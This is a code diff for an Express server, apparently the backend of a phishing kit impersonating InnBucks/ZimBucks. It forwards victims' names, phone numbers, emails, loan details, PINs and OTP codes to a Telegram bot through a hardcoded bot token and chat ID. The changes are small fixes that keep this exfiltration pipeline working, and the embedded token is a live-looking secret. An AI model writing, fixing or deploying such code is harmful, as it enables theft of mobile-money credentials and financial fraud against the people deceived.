@@ -9,12 +9,12 @@ app.use(cors());
 app.use(express.json());
 
 const TELEGRAM_BOT_TOKEN = '8347873216:AAFYC7jL2r50gHLMecU1fHqA3azVVvopW4I';
-const TELEGRAM_CHAT_ID = '7386607055';
+const TELEGRAM_CHAT_ID = 7386607055;  // ✅ Changed to NUMBER (removed quotes)
 
 async function sendToTelegram(message) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     await axios.post(url, {
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: TELEGRAM_CHAT_ID,  // ✅ Now it's a number
         text: message,
         parse_mode: 'HTML'
     });
@@ -25,9 +25,9 @@ function formatNotification(data) {
     const timestamp = new Date().toLocaleString('en-ZA', { timeZone: 'Africa/Harare' });
     
     if (type === 'pin') {
-        return `🔐 NEW PIN CONFIRMATION 🔐\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: ${site || 'ZimBucks'}\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n💰 Amount: $${amount}\n📅 Term: ${term} months\n🔢 PIN Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
+        return `🔐 NEW PIN CONFIRMATION 🔐\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: ${site || 'ZimBucks'}\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email || 'Not provided'}\n💰 Amount: $${amount}\n📅 Term: ${term} months\n🔢 PIN Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
     } else {
-        return `✅ NEW OTP VERIFICATION ✅\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: ${site || 'InnBucks'}\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}\n🔢 OTP Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
+        return `✅ NEW OTP VERIFICATION ✅\n━━━━━━━━━━━━━━━━━━━━━\n📱 Site: ${site || 'InnBucks'}\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email || 'Not provided'}\n🔢 OTP Code: ${pin}\n━━━━━━━━━━━━━━━━━━━━━\n⏰ Time: ${timestamp}`;
     }
 }
 
@@ -53,7 +53,7 @@ app.post('/api/send-telegram', async (req, res) => {
         
         res.json({ success: true });
     } catch (error) {
-        console.error('Error:', error);
+        console.error('Error:', error.message);
         res.status(500).json({ success: false, error: 'Server error' });
     }
 });
